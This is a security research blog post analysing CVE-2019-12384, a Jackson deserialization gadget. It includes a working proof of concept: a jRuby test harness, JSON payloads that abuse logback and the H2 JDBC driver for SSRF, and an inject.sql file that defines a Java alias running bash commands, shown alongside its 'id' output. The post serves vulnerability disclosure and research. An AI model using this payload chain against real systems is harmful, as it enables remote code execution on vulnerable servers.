<!DOCTYPE html>
<html lang="en-us">

  <head>
  <!-- Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-164212227-2"></script>
  <script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-164212227-2');
  </script>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" /><![endif]-->
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Doyensec's Blog :: Doyensec is an independent security research and development company focused on vulnerability discovery and remediation." />
  <meta name="keywords" content="doyensec, doyensecurity, security, infosec, vulnerability, exploit, offensive, pentest, pentester, hacking, auditing, reverse engineering, automation" />
  <meta name="robots" content="index, follow" />
  <meta name="robots" content="noodp" />
  <meta name="robots" content="noydir" />

  <title>
    
      Jackson gadgets - Anatomy of a vulnerability &middot; Doyensec's Blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/images/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/public/images/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class="theme-base-doyensec">

    <div class="sidebar">
  <div class="navbar-brand"><a href="/index.html"><img src="/public/images/logo.png" class="navbar-brand__image"></a></div>
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <p class="lead">We are <a href="https://doyensec.com" target="_blank">security engineers</a> who break bits and tell stories.<br><br>Visit us<br><a href="https://doyensec.com" target="_blank">doyensec.com</a><br><br>Follow us<br><a href="https://twitter.com/doyensec" target="_blank">@doyensec</a><br><br>Engage us<br><a href="mailto:info@doyensec.com" target="_blank">info@doyensec.com</a><br><br></p>
    </div>

    <nav class="sidebar-nav">
      

      
      
        
          
        
      
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
        
          
        
      
    </nav>
    <h4 id="archive-header">Blog Archive</h4>
    <ul class="posts-archive">
            
            
            
              <li>
                <a class="yearBtn" data-year="2017" href="#">2017</a>
                <div class="postsMonths" id="posts-in-2017" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1511737200" data-url="/2017/11/27/we-are-hiring.html" data-title="We're hiring - Join Doyensec!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1510700400" data-url="/2017/11/15/osx-spotlight.html" data-title="Staring into the Spotlight"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1501711200" data-url="/2017/08/03/electron-framework-security.html" data-title="Modern Alchemy: Turning XSS into RCE"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1488409200" data-url="/2017/03/02/training-burp.html" data-title="Developing Burp Suite Extensions training"></span>
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2018" href="#">2018</a>
                <div class="postsMonths" id="posts-in-2018" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1541372400" data-url="/2018/11/05/burp-rest-api-v2.html" data-title="Introducing burp-rest-api v2"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1531951200" data-url="/2018/07/19/instrumenting-electron-app.html" data-title="Instrumenting Electron Apps for Security Testing"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1527112800" data-url="/2018/05/24/electron-win-protocol-handler-bug-bypass.html" data-title="Electron Windows Protocol Handler MITM/RCE (bypass for CVE-2018-1000006 fix)"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1526508000" data-url="/2018/05/17/graphql-security-overview.html" data-title="GraphQL - Security Overview and Testing Tips"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2019" href="#">2019</a>
                <div class="postsMonths" id="posts-in-2019" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1572908400" data-url="/2019/11/05/internship-at-doyensec.html" data-title="Internship at Doyensec"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1566424800" data-url="/2019/08/22/modern-password-managers-flag-secure.html" data-title="One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1564610400" data-url="/2019/08/01/common-crypto-bugs.html" data-title="Lessons in auditing cryptocurrency wallets, systems, and infrastructures"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1563746400" data-url="/2019/07/22/jackson-gadgets.html" data-title="Jackson gadgets - Anatomy of a vulnerability"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1562104800" data-url="/2019/07/03/electron-security-workshop.html" data-title="Electron Security Workshop"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1560204000" data-url="/2019/06/11/electronegativity-1.3.html" data-title="Electronegativity 1.3.0 released!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1556056800" data-url="/2019/04/24/rubyzip-bug.html" data-title="On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1554242400" data-url="/2019/04/03/subverting-electron-apps-via-insecure-preload.html" data-title="Subverting Electron Apps via Insecure Preload"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1548284400" data-url="/2019/01/24/electronegativity.html" data-title="Electronegativity is finally out!"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2020" href="#">2020</a>
                <div class="postsMonths" id="posts-in-2020" style="display:none">
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1608159600" data-url="/2020/12/17/psychology-of-remote-work.html" data-title="Psychology of Remote Work"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1607554800" data-url="/2020/12/10/novel-abuses-wifi-direct-mobile-file-transfers.html" data-title="Novel Abuses On Wi-Fi Direct Mobile File Transfers"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1605740400" data-url="/2020/11/19/inql-scanner-v3.html" data-title="InQL Scanner v3 - Just Released!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1599602400" data-url="/2020/09/09/fuzzilli-jerryscript.html" data-title="Fuzzing JavaScript Engines with Fuzzilli"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1597874400" data-url="/2020/08/20/playframework-csrf-bypass.html" data-title="CSRF Protection Bypass in Play Framework"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1591826400" data-url="/2020/06/11/inql-scanner-v2.html" data-title="InQL Scanner v2 is out!"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1589407200" data-url="/2020/05/14/asn1fuzz.html" data-title="Fuzzing TLS certificates from their ASN.1 grammar"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1588197600" data-url="/2020/04/30/polymorphic-images-for-xss.html" data-title="Researching Polymorphic Images for XSS on Google Scholar"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1586296800" data-url="/2020/04/08/libressl-fuzzer.html" data-title="LibreSSL and OSS-Fuzz"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1585177200" data-url="/2020/03/26/graphql-scanner.html" data-title="InQL Scanner"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1584313200" data-url="/2020/03/16/vscode_codeexec.html" data-title="Don't Clone That Repo: Visual Studio Code^2 Execution"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1583103600" data-url="/2020/03/02/gravitational-audit.html" data-title="2019 Gravitational Security Audit Results"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1582498800" data-url="/2020/02/24/electron-updater-update-signature-bypass.html" data-title="Signature Validation Bypass Leading to RCE In Electron-Updater"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1582066800" data-url="/2020/02/19/solokeys-audit.html" data-title="Security Analysis of the Solo Firmware"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1580684400" data-url="/2020/02/03/heap-exploit.html" data-title="Heap Overflow in F-Secure Internet Gatekeeper"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
              <li>
                <a class="yearBtn" data-year="2021" href="#">2021</a>
                <div class="postsMonths" id="posts-in-2021" style="display:none">
                  
                    
                    
                    
                      <span class="post-entry" data-date="1621461600" data-url="/2021/05/20/graphql-csrf.html" data-title="That single GraphQL issue that you keep missing"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1615417200" data-url="/2021/03/11/regexploit.html" data-title="Regexploit: DoS-able Regular Expressions"></span>
                    
                  
                    
                    
                    
                      <span class="post-entry" data-date="1613430000" data-url="/2021/02/16/electron-apis-misuse.html" data-title="Electron APIs Misuse: An Attacker’s First Choice"></span>
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                    
                    
                    
                  
                </div>
              </li>
            
    </ul>
    <p>&copy; 2021 <a href="https://doyensec.com" target="_blank">Doyensec LLC.</a></p>
  </div>
</div>


    <div class="content container">
      <div class="post">
  <h1 class="post-title">Jackson gadgets - Anatomy of a vulnerability</h1>
  <span class="post-date">22 Jul 2019 - Posted by Andrea Brancaleoni</span>
  <h2 id="jackson-cve-2019-12384-anatomy-of-a-vulnerability-class">Jackson CVE-2019-12384: anatomy of a vulnerability class</h2>

<p>During one of our engagements, we analyzed an application which used the
<a href="https://github.com/FasterXML/jackson">Jackson</a> library for deserializing JSONs.
In that context, we have identified a deserialization vulnerability where we could control
the class to be deserialized. In this article, we want to show how an attacker may leverage this deserialization vulnerability to trigger attacks such as Server-Side Request Forgery (SSRF) and remote code execution.</p>

<p>This research also resulted in a new <a href="https://access.redhat.com/security/cve/cve-2019-12384">CVE-2019-12384</a> and a bunch of RedHat products affected by it:</p>

<!-- put image about the impact -->
<p><img src="../../../public/images/jackson-impact.png" alt="Vulnerability Impact" align="center" width="500" /></p>

<h2 id="what-is-required">What is required?</h2>

<p>As reported by Jackson’s author in
<a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96">On Jackson CVEs: Don’t Panic — Here is what you need to know</a> the requirements
for a Jackson “gadget” vulnerability are:</p>

<ol>
  <li>
    <p>(1) The application accepts JSON content sent by an untrusted client (composed either manually or by a code
you did not write and have no visibility or control over) — meaning that you can
not constrain JSON itself that is being sent</p>
  </li>
  <li>
    <p>(2) The application uses polymorphic type handling for properties with nominal type of
<em>java.lang.Object</em> (or one of small number of “permissive” tag interfaces such as 
<em>java.util.Serializable</em>, <em>java.util.Comparable</em>)</p>
  </li>
  <li>
    <p>(3) The application has at least one specific “gadget” class to exploit in the Java classpath. In detail, exploitation requires a class that works with Jackson. In fact, most gadgets only work with specific libraries — e.g. most commonly reported ones work with JDK serialization</p>
  </li>
  <li>
    <p>(4) The application uses a version of Jackson that does not (yet) block the specific “gadget” class. There is a set of published gadgets which grows over time so it is a race between people finding and reporting gadgets and the patches. Jackson operates on a blacklist. The deserialization is a “feature” of the platform and they continually update a <a href="https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java">blacklist of known gadgets that people report</a>.</p>
  </li>
</ol>

<p>In this research we assumed that the preconditions (1) and (2) are satisfied. Instead, we concentrated
on finding a gadget that could meet both (3) and (4). Please note that Jackson is one of the most used deserialization frameworks for Java applications
where polymorphism is a first-class concept. Finding these conditions
comes at zero-cost to a potential attacker who may use
<a href="https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION">static analysis tools</a>
or other dynamic techniques, such as grepping for <code class="language-plaintext highlighter-rouge">@class</code> in request/responses, to find these targets.</p>

<h2 id="preparing-for-the-battlefield">Preparing for the battlefield</h2>

<p>During our research we developed a tool to assist the discovery of such vulnerabilities. When Jackson deserializes
<code class="language-plaintext highlighter-rouge">ch.qos.logback.core.db.DriverManagerConnectionSource</code>, this class can be abused to
instantiate a JDBC connection. JDBC stands for (J)ava (D)ata(b)ase (C)onnectivity.
JDBC is a Java API to connect and execute a query with the database and it
is a part of JavaSE (Java Standard Edition). Moreover, JDBC uses an automatic
string to class mapping, as such it is a perfect target to load and execute
even more “gadgets” inside the chain.</p>

<p>In order to demonstrate the attack, we prepared a wrapper in which
we load arbitrary polymorphic classes specified by an attacker.
For the environment we used <a href="https://www.jruby.org/">jRuby</a>, a ruby implementation running on top of the Java Virtual Machine (JVM). With its integration on top of the JVM, we can easily load and instantiate Java classes.</p>

<p>We’ll use this setup to load Java classes easily in a given directory and prepare the Jackson environment to meet
the first two requirements (1,2) listed above. In order to do that, we implemented the following <a href="https://www.jruby.org/">jRuby</a> script.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'java'</span>
<span class="no">Dir</span><span class="p">[</span><span class="s2">"./classpath/*.jar"</span><span class="p">].</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
	<span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>
<span class="n">java_import</span> <span class="s1">'com.fasterxml.jackson.databind.ObjectMapper'</span>
<span class="n">java_import</span> <span class="s1">'com.fasterxml.jackson.databind.SerializationFeature'</span>

<span class="n">content</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="nb">puts</span> <span class="s2">"Mapping"</span>
<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="p">.</span><span class="nf">new</span>
<span class="n">mapper</span><span class="p">.</span><span class="nf">enableDefaultTyping</span><span class="p">()</span>
<span class="n">mapper</span><span class="p">.</span><span class="nf">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="nb">puts</span> <span class="s2">"Serializing"</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="p">.</span><span class="nf">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="p">.</span><span class="nf">lang</span><span class="o">.</span><span class="no">Object</span><span class="p">.</span><span class="nf">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">"objectified"</span>
<span class="nb">puts</span> <span class="s2">"stringified: "</span> <span class="o">+</span> <span class="n">mapper</span><span class="p">.</span><span class="nf">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div></div>

<p>The script proceeds as follows:</p>

<ol>
  <li>At line 2, it loads all of the classes contained in the Java Archives (JAR) within the “classpath” subdirectory</li>
  <li>Between lines 5 and 13, it configures Jackson in order to meet requirements (#2)</li>
  <li>Between lines 14 and 17, it deserializes and serializes a polymorphic Jackson object passed to jRuby as JSON</li>
</ol>

<h2 id="memento-reaching-the-gadget">Memento: reaching the gadget</h2>

<p>For this research we decided to
use gadgets that are widely used by the Java community. All the libraries
targeted in order to demonstrate this attack are in the top 100 most common libraries in the <a href="https://search.maven.org/">Maven central</a>
repository.</p>

<p>To follow along and to prepare for the attack, you can download the following libraries and put them in the “classpath” directory:</p>
<ul>
  <li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-databind/2.9.8/jackson-databind-2.9.8.jar">jackson-databind-2.9.8</a></li>
  <li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-annotations/2.9.8/jackson-annotations-2.9.8.jar">jackson-annotations-2.9.8</a></li>
  <li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.9.8/jackson-core-2.9.8.jar">jackson-core-2.9.8</a></li>
  <li><a href="http://central.maven.org/maven2/ch/qos/logback/logback-core/1.3.0-alpha4/logback-core-1.3.0-alpha4.jar">logback-core-1.3.0-alpha4</a></li>
  <li><a href="http://central.maven.org/maven2/com/h2database/h2/1.4.199/h2-1.4.199.jar">h2-1.4.199</a></li>
</ul>

<p>It should be noted the <code class="language-plaintext highlighter-rouge">h2</code> library is not required to perform SSRF, since our experience suggests that
most of the time Java applications load at least one JDBC Driver. JDBC Drivers are classes that, when
a JDBC url is passed in, are automatically instantiated and the full URL is passed to them as an argument.</p>

<p>Using the following command, we will call the previous script with the aforementioned classpath.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>jruby test.rb <span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource</span><span class="se">\"</span><span class="s2">, {</span><span class="se">\"</span><span class="s2">url</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">jdbc:h2:mem:</span><span class="se">\"</span><span class="s2">}]"</span>
</code></pre></div></div>

<p>On line 15 of the script, Jackson will recursively call all of the setters with the key
contained inside the subobject. To be more specific, the <code class="language-plaintext highlighter-rouge">setUrl(String url)</code> is called with arguments by
the Jackson reflection library. After that phase (line 17) the full object is serialized into a JSON
object again. At this point all the fields are serialized directly, if no getter is defined,
or through an explicit getter. The interesting getter for us is <code class="language-plaintext highlighter-rouge">getConnection()</code>.
In fact, as an attacker, we are interested in all <a href="http://tutorials.jenkov.com/java-functional-programming/index.html#pure-functions">“non pure” methods</a>
that have interesting side effects where we control an argument.</p>

<p>When the <code class="language-plaintext highlighter-rouge">getConnection</code> is called, an in memory database is instantiated. Since the application
is short lived, we won’t see any meaningful effect from the attacker’s perspective. In order to do something more meaningful
we create a connection to a remote database. If the target application is deployed as a remote service, 
an attacker can generate a Server Side Request Forgery (SSRF). The following screenshot is an example of this scenario.</p>

<!-- put screenshot here -->
<p><img src="../../../public/images/jackson-chain.png" alt="Jackson Chain" align="center" /></p>

<h2 id="enter-the-matrix-from-ssrf-to-rce">Enter the Matrix: From SSRF to RCE</h2>

<p>As you may have noticed both of these scenarios lead to DoS and SSRF. While those attacks may affect the application security, we want to show you a simple and effective technique
to turn a SSRF into a full chain RCE.</p>

<p>In order to gain full code execution in the context of the
application, we employed the capability of loading the <a href="http://www.h2database.com/html/features.html">H2</a> JDBC Driver. 
<a href="http://www.h2database.com/html/features.html">H2</a> is a super fast SQL database usually employed as in memory replacement for full-fledged
SQL Database Management Systems (such as Postgresql, MSSql, MySql or OracleDB).
It is easily configurable and it actually supports many modes such as
in memory, on file, and on remote servers. H2 has the capability to run SQL scripts from the JDBC URL, which was added in order to have an in-memory database that supports init
<a href="https://edgeguides.rubyonrails.org/active_record_migrations.html">migrations</a>.
This alone won’t allow an attacker to actually execute Java code inside the JVM
context. However <a href="http://www.h2database.com/html/features.html">H2</a>, since it was
implemented inside the JVM, <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">has the capability to specify custom aliases containing
java code</a>.
This is what we can abuse to execute arbitrary code.</p>

<p>We can easily serve the following <code class="language-plaintext highlighter-rouge">inject.sql</code> INIT file through a simple http server such as a python one (e.g. <code class="language-plaintext highlighter-rouge">python -m SimpleHttpServer</code>).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id &gt; exploited.txt')
</code></pre></div></div>

<p>And run the tester application with:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>jruby test.rb <span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource</span><span class="se">\"</span><span class="s2">, {</span><span class="se">\"</span><span class="s2">url</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'</span><span class="se">\"</span><span class="s2">}]"</span>
...
<span class="nv">$ </span><span class="nb">cat </span>exploited.txt
<span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>...<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span>,12<span class="o">(</span>everyone<span class="o">)</span>,61<span class="o">(</span>localaccounts<span class="o">)</span>,79<span class="o">(</span>_appserverusr<span class="o">)</span>,80<span class="o">(</span>admin<span class="o">)</span>,81<span class="o">(</span>_appserveradm<span class="o">)</span>,98<span class="o">(</span>_lpadmin<span class="o">)</span>,501<span class="o">(</span>access_bpf<span class="o">)</span>,701<span class="o">(</span>com.apple.sharepoint.group.1<span class="o">)</span>,33<span class="o">(</span>_appstore<span class="o">)</span>,100<span class="o">(</span>_lpoperator<span class="o">)</span>,204<span class="o">(</span>_developer<span class="o">)</span>,250<span class="o">(</span>_analyticsusers<span class="o">)</span>,395<span class="o">(</span>com.apple.access_ftp<span class="o">)</span>,398<span class="o">(</span>com.apple.access_screensharing<span class="o">)</span>,399<span class="o">(</span>com.apple.access_ssh<span class="o">)</span>
</code></pre></div></div>

<p>Voila’!</p>

<h2 id="iterative-taint-tracking">Iterative Taint-Tracking</h2>

<p>Exploitation of deserialization vulnerabilities is complex and takes time. When conducting a product security review,  time constraints can make it difficult to find the appropriate gadgets to use in exploitation. On the other end, the Jackson blacklists are updated on a monthly basis while users of this mechanism (e.g. enterprise applications) may have yearly release cycles.</p>

<p>Deserialization vulnerabilities are the typical needle-in-the-haystack problem. On the one hand, identifying a vulnerable entry point is an easy task, while finding a useful gadget may be time consuming (and tedious).
At Doyensec we developed a technique to find useful Jackson gadgets to facilitate the latter effort.
We built a static analysis tool that can find serialization gadgets through
<a href="https://en.wikipedia.org/wiki/Taint_checking">taint-tracking</a> analysis.
We designed it to be fast enough to run multiple times and iterate/improve through a custom and extensible rule-set language.
On average a run on a Macbook PRO i7 2018 takes 2 minutes.</p>

<!-- put a picture here of taint tracking -->
<p><img src="../../../public/images/jackson-taint.png" alt="Jackson Taint Tracking" align="center" width="500" /></p>

<p>Taint-tracking is a topical academic research subject.
Academic research tools are focused on a very high recall and precision.
The trade-off lies between high-recall/precision versus speed/memory.
Since we wanted this tool to be usable while testing commercial grade products
and we valued the customizability of the tool by itself, we focused on speed and usability instead of high recall.
While the tool is inspired by other research such as <a href="https://blogs.uni-paderborn.de/sse/tools/flowdroid/">flowdroid</a>,
the focus of our technique is not to rule out the human analyst. Instead, we believe in augmenting manual testing and exploitation with customizable <a href="https://doyensec.com/automation.html">security automation</a>.</p>

<p>This research was possible thanks to the <a href="https://doyensec.com/careers.html">25% research time</a> at Doyensec. Tune in again for new episodes.</p>

<p>That’s all folks! Keep it up and be safe!</p>

</div>
<div class="related">
  <h3>Other relevant posts:</h3> 
  <ul class="related-posts">
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2021/03/11/regexploit.html">
            Regexploit: DoS-able Regular Expressions
            <small>11 Mar 2021</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2020/04/30/polymorphic-images-for-xss.html">
            Researching Polymorphic Images for XSS on Google Scholar
            <small>30 Apr 2020</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2019/08/22/modern-password-managers-flag-secure.html">
            One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse
            <small>22 Aug 2019</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2019/08/01/common-crypto-bugs.html">
            Lessons in auditing cryptocurrency wallets, systems, and infrastructures
            <small>01 Aug 2019</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
    
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2019/04/24/rubyzip-bug.html">
            On insecure zip handling, Rubyzip and Metasploit RCE (CVE-2019-5624)
            <small>24 Apr 2019</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2018/11/05/burp-rest-api-v2.html">
            Introducing burp-rest-api v2
            <small>05 Nov 2018</small>
          </a>
        </h3>
      </li>
       
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
                           
    
    
    
    
      
      <li>
        <h3>
          <a href="/2017/03/02/training-burp.html">
            Developing Burp Suite Extensions training
            <small>02 Mar 2017</small>
          </a>
        </h3>
      </li>
       
                           
    
  </ul>
</div>

    </div>

  <script src="/public/js/jquery.min.js"></script>
  <script src="/public/js/main.js"></script>
  </body>
</html>
